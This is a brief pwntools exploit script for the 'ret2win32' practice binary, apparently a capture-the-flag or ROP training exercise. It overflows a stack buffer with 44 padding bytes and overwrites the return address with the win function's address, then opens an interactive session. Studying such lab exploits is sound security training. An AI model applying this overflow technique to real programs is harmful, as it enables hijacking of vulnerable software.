from pwn import *

r = process("./ret2win32")

ret2win = 0x804862c
payload = b'a'*44 + p32(ret2win)
r.sendline(payload)
r.interactive()